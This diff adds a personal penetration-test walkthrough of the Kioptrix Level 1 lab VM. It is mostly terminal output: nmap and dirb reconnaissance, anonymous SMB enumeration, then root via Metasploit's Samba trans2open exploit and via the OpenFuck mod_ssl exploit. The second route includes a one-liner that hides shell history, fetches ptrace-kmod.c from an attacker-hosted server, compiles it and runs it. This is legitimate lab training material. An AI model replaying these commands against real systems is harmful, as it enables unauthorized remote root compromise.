@@ -1,0 +1,375 @@
+root@kali:~# nmap -sS 172.16.161.132
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-10-19 09:37 EDT
+Nmap scan report for 172.16.161.132
+Host is up (0.00049s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+443/tcp  open  https
+1024/tcp open  kdm
+MAC Address: 00:0C:29:A6:2E:F7 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 13.34 seconds
+
+# not very specific. 
+
+root@kali:~# nmap -sV 172.16.161.132
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-10-19 09:38 EDT
+Nmap scan report for 172.16.161.132
+Host is up (0.00048s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+1024/tcp open  status      1 (RPC #100024)
+MAC Address: 00:0C:29:A6:2E:F7 (VMware)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.63 seconds
+
+# looks a lot more promising. 
+# kick all ports while poking around with a browser. 
+
+view-source:http://172.16.161.132/
+# results in apache test page. 
+# same on 443/https
+# no robots.txt results
+# found everything interesting the first time around. 
+
+root@kali:~# nmap -sV 172.16.161.132 -p-
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-10-19 09:40 EDT
+Nmap scan report for 172.16.161.132
+Host is up (0.00037s latency).
+Not shown: 65529 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+1024/tcp open  status      1 (RPC #100024)
+MAC Address: 00:0C:29:A6:2E:F7 (VMware)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.27 seconds
+
+# quick brute gives us one more result, /manual
+root@kali:~# dirb http://172.16.161.132/ /usr/share/dirb/wordlists/vulns/apache.txt 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Oct 19 09:45:21 2016
+URL_BASE: http://172.16.161.132/
+WORDLIST_FILES: /usr/share/dirb/wordlists/vulns/apache.txt
+
+-----------------
+
+GENERATED WORDS: 30                                                            
+
+---- Scanning URL: http://172.16.161.132/ ----
++ http://172.16.161.132/index.html (CODE:200|SIZE:2890)                                                                                        
+==> DIRECTORY: http://172.16.161.132/manual/                                                                                                   
++ http://172.16.161.132/~root (CODE:403|SIZE:269)                                                                                              
+                                                                                                                                               
+---- Entering directory: http://172.16.161.132/manual/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Wed Oct 19 09:45:21 2016
+DOWNLOADED: 30 - FOUND: 2
+
+# trying to connect with browser doesn't work, redirects to 127.0.0.1. 
+# setting system proxy for burp eliminates the need to point each app 
+# through a proxy. 
+# open burp to get a better look at wtf. 
+# requesting /manual gets 301 redirect, requesting /manual/ gets content. 
+# lets throw a bit longer list, then spider w/burp
+
+
+# screenshot#1 = burp spider results
+
+# viewing /manual/ leads me to think mod_perl and mod_ssl are installed. 
+# ssl i already knew from nmap
+# results from "big.txt"
+
+root@kali:~# dirb http://172.16.161.132/ /usr/share/dirb/wordlists/big.txt 
+...
+==> DIRECTORY: http://172.16.161.132/manual/                                                                                                   
+==> DIRECTORY: http://172.16.161.132/mrtg/                                                                                                     
+==> DIRECTORY: http://172.16.161.132/usage/         
+...
+
+# something, mrtg or other, is running to create usage stats realtime
+# looking at a detailed view, we find test.php
+
+# screenshot#2 = usage...test.php
+
+-------------------------------------------------------------------------------
+
+# http is not the only thing running, and nothing easy jumped out at me. 
+# what else? SMB? 
+
+root@kali:~# smbclient -N -L 172.16.161.132
+WARNING: The "syslog" option is deprecated
+Anonymous login successful
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	IPC$            IPC       IPC Service (Samba Server)
+	ADMIN$          IPC       IPC Service (Samba Server)
+Anonymous login successful
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+
+	Server               Comment
+	---------            -------
+	KIOPTRIX             Samba Server
+
+	Workgroup            Master
+	---------            -------
+	MYGROUP              KIOPTRIX
+	
+# samba running. old as fuck. 
+
+root@kali:~# searchsploit samba 2.2 remote
+------------------------------------------------------------------------------------------------------------- ----------------------------------
+ Exploit Title                                                                                               |  Path
+                                                                                                             | (/usr/share/exploitdb/platforms)
+------------------------------------------------------------------------------------------------------------- ----------------------------------
+Samba 2.2.x - Remote Root Buffer Overflow Exploit                                                            | ./linux/remote/7.pl
+Samba <= 2.2.8 - Remote Root Exploit                                                                         | ./linux/remote/10.c
+Samba 2.2.8 - (Bruteforce Method) Remote Root Exploit                                                        | ./linux/remote/55.c
+Samba 2.2.0 - 2.2.8 - trans2open Overflow (OS X)                                                             | ./osx/remote/9924.rb
+Samba 2.2.x - nttrans Overflow                                                                               | ./linux/remote/9936.rb
+Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow                                                                  | ./linux/remote/16321.rb
+Samba 2.0.x/2.2 - Remote Arbitrary File Creation Vulnerability                                               | ./unix/remote/20968.txt
+Samba SMB 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow Vulnerability                    | ./unix/remote/22356.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow Vulnerability (1)                                     | ./unix/remote/22468.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow Vulnerability (2)                                     | ./unix/remote/22469.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow Vulnerability (3)                                     | ./unix/remote/22470.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow Vulnerability (4)                                     | ./unix/remote/22471.txt
+------------------------------------------------------------------------------------------------------------- ----------------------------------
+
+# let's try msf
+
+root@kali:~# msfconsole
+[-] Failed to connect to the database: could not connect to server: Connection refused
+	Is the server running on host "localhost" (::1) and accepting
+	TCP/IP connections on port 5432?
+could not connect to server: Connection refused
+	Is the server running on host "localhost" (127.0.0.1) and accepting
+	TCP/IP connections on port 5432?
+
+                                                  
+# cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+
+
+Love leveraging credentials? Check out bruteforcing
+in Metasploit Pro -- learn more on http://rapid7.com/metasploit
+
+       =[ metasploit v4.11.14-dev                         ]
++ -- --=[ 1523 exploits - 887 auxiliary - 259 post        ]
++ -- --=[ 437 payloads - 38 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf > use exploit/linux/samba/trans2open 
+msf exploit(trans2open) > set rhost 172.16.161.132
+rhost => 172.16.161.132
+msf exploit(trans2open) > Interrupt: use the 'exit' command to quit
+msf exploit(trans2open) > set payload linux/x86/shell_bind_tcp
+payload => linux/x86/shell_bind_tcp
+msf exploit(trans2open) > exploit
+
+[*] Started bind handler
+[*] 172.16.161.132:139 - Trying return address 0xbffffdfc...
+[*] 172.16.161.132:139 - Trying return address 0xbffffcfc...
+[*] 172.16.161.132:139 - Trying return address 0xbffffbfc...
+[*] 172.16.161.132:139 - Trying return address 0xbffffafc...
+[*] Command shell session 1 opened (172.16.161.131:34797 -> 172.16.161.132:4444) at 2016-10-19 14:40:12 -0400
+
+whoami
+root
+hostname
+kioptrix.level1
+
+# all too easy. (thanks mogozobo!)
+
+# another take, openssl is vuln. 
+# this line from nmap: 
+# 443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+
+root@kali:~# searchsploit openssl
+-------------------------------------------------------------------------------- ----------------------------------
+ Exploit Title                                                                  |  Path
+                                                                                | (/usr/share/exploitdb/platforms)
+-------------------------------------------------------------------------------- ----------------------------------
+OpenSSL ASN.1<= 0.9.6j <= 0.9.7b - Brute Forcer for Parsing Bugs                | ./multiple/dos/146.c
+Apache OpenSSL - Remote Exploit (Multiple Targets) (OpenFuckV2.c)               | ./linux/remote/764.c
+OpenSSL < 0.9.7l / 0.9.8d - SSLv2 Client Crash Exploit                          | ./multiple/dos/4773.pl
+Debian OpenSSL - Predictable PRNG Bruteforce SSH Exploit (Perl)                 | ./linux/remote/5622.txt
+Debian OpenSSL - Predictable PRNG Bruteforce SSH Exploit (Ruby)                 | ./linux/remote/5632.rb
+Debian OpenSSL - Predictable PRNG Bruteforce SSH Exploit (Python)               | ./linux/remote/5720.py
+OpenSSL <= 0.9.8k / 1.0.0-beta2 - DTLS Remote Memory Exhaustion DoS             | ./multiple/dos/8720.c
+OpenSSL < 0.9.8i DTLS ChangeCipherSpec Remote DoS Exploit                       | ./multiple/dos/8873.c
+OpenSSL - Remote DoS                                                            | ./linux/dos/12334.c
+OpenSSL ASN1 BIO Memory Corruption Vulnerability                                | ./multiple/dos/18756.txt
+PHP 6.0 openssl_verify() Local Buffer Overflow PoC                              | ./windows/dos/19963.txt
+OpenSSL SSLv2 - Malformed Client Key Remote Buffer Overflow Vulnerability (1)   | ./unix/remote/21671.c
+OpenSSL SSLv2 - Malformed Client Key Remote Buffer Overflow Vulnerability (2)   | ./unix/remote/21672.c
+OpenSSL 0.9.x CBC Error Information Leakage Weakness                            | ./linux/remote/22264.txt
+OpenSSL ASN.1 Parsing Vulnerabilities                                           | ./multiple/remote/23199.c
+OpenSSL SSLv2 - Null Pointer Dereference Client Denial of Service Vulnerability | ./multiple/dos/28726.pl
+PHP openssl_x509_parse() - Memory Corruption Vulnerability                      | ./php/dos/30395.txt
+OpenSSL TLS Heartbeat Extension - Memory Disclosure                             | ./multiple/remote/32745.py
+OpenSSL 1.0.1f TLS Heartbeat Extension - Memory Disclosure (Multiple SSL/TLS ve | ./multiple/remote/32764.py
+Heartbleed OpenSSL - Information Leak Exploit (1)                               | ./multiple/remote/32791.c
+Heartbleed OpenSSL - Information Leak Exploit (2) - DTLS Support                | ./multiple/remote/32998.c
+OpenSSL - 'ssl3_get_key_exchange()' Use-After-Free Memory Corruption Vulnerabil | ./linux/dos/34427.txt
+PHP 5.x OpenSSL Extension openssl_encrypt Function Plaintext Data Memory Leak D | ./php/dos/35486.php
+PHP 5.x OpenSSL Extension x Function openssl_decrypt Ciphertext Data Memory Lea | ./php/dos/35487.php
+OpenSSL Alternative Chains Certificate Forgery                                  | ./multiple/webapps/38640.rb
+-------------------------------------------------------------------------------- ----------------------------------
+
+# openfuck sounds fun. 
+# https://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1/
+# learned a little about fixing compilation errors, 
+# http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/
+# ok, get that working, but like the author in the top link, no inet from kioptrix
+# wget the file, 
+
+root@kali:~# wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+--2016-10-19 15:47:26--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+Resolving dl.packetstormsecurity.net (dl.packetstormsecurity.net)... 198.84.60.200, 198.84.60.200
+Connecting to dl.packetstormsecurity.net (dl.packetstormsecurity.net)|198.84.60.200|:80... connected.
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
+--2016-10-19 15:47:27--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+Connecting to dl.packetstormsecurity.net (dl.packetstormsecurity.net)|198.84.60.200|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3921 (3.8K) [text/x-csrc]
+Saving to: ‘ptrace-kmod.c’
+
+ptrace-kmod.c       100%[===================>]   3.83K  --.-KB/s    in 0s      
+
+2016-10-19 15:47:33 (26.5 MB/s) - ‘ptrace-kmod.c’ saved [3921/3921]
+
+# spawn a quick http server
+
+root@kali:~# python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+
+# re-run the exploit and grab from Kali
+
+root@kali:~# ./764_sploit 0x6b 172.16.161.132
+
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x8101e88
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+bash-2.05$ 
+bash-2.05$ unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.nl/0xploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; 
+--15:55:07--  http://dl.packetstormsecurity.nl/0304-exploits/ptrace-kmod.c
+           => `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.nl:80... 
+dl.packetstormsecurity.nl: Host not found.
+gcc: ptrace-kmod.c: No such file or directory
+gcc: No input files
+rm: cannot remove `ptrace-kmod.c': No such file or directory
+bash: ./p: No such file or directory
+bash-2.05$ 
+bash-2.05$ wget http://172.16.161.131/ptrace-kmod.c
+wget http://172.16.161.131/ptrace-kmod.c
+--15:55:45--  http://172.16.161.131/ptrace-kmod.c
+           => `ptrace-kmod.c'
+Connecting to 172.16.161.131:80... 
+Connection to 172.16.161.131:80 refused.
+bash-2.05$ wget http://172.16.161.131:8000/ptrace-kmode.c
+wget http://172.16.161.131:8000/ptrace-kmode.c
+--15:56:16--  http://172.16.161.131:8000/ptrace-kmode.c
+           => `ptrace-kmode.c'
+Connecting to 172.16.161.131:8000... connected!
+HTTP request sent, awaiting response... 404 File not found
+15:56:16 ERROR 404: File not found.
+
+bash-2.05$ wget http://172.16.161.131:8000/ptrace-kmod.c
+wget http://172.16.161.131:8000/ptrace-kmod.c
+--15:58:24--  http://172.16.161.131:8000/ptrace-kmod.c
+           => `ptrace-kmod.c'
+Connecting to 172.16.161.131:8000... connected!
+HTTP request sent, awaiting response... 200 OK
+Length: 3,921 [text/plain]
+
+    0K ...                                                   100% @   3.74 MB/s
+
+15:58:24 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]
+
+bash-2.05$ 
+
+# nevermind a few typos
+# now compile the new exploit on the target, and ...
+
+bash-2.05$ ls -la
+ls -la
+total 27
+drwxrwxrwt    2 root     root         1024 Oct 26 18:42 .
+drwxr-xr-x   19 root     root         1024 Oct 26 18:31 ..
+-rwsr-sr-x    1 root     root        19920 Oct 26 18:34 p
+-rw-r--r--    1 apache   apache       3921 Apr  1  2003 ptrace-kmod.c
+bash-2.05$ gcc -o pwnage ptrace-kmod.c
+gcc -o pwnage ptrace-kmod.c
+bash-2.05$ ls -la
+ls -la
+total 48
+drwxrwxrwt    2 root     root         1024 Oct 26 18:42 .
+drwxr-xr-x   19 root     root         1024 Oct 26 18:31 ..
+-rwsr-sr-x    1 root     root        19920 Oct 26 18:34 p
+-rw-r--r--    1 apache   apache       3921 Apr  1  2003 ptrace-kmod.c
+-rwxr-xr-x    1 apache   apache      19920 Oct 26 18:42 pwnage
+bash-2.05$ ./pwnage
+./pwnage
+[+] Attached to 1307
+[+] Waiting for signal
+[+] Signal caught
+[+] Shellcode placed at 0x4001189d
+[+] Now wait for suid shell...
+whoami
+root
+
+# pwnage. 2/2
+# 
+
+
+
+
+
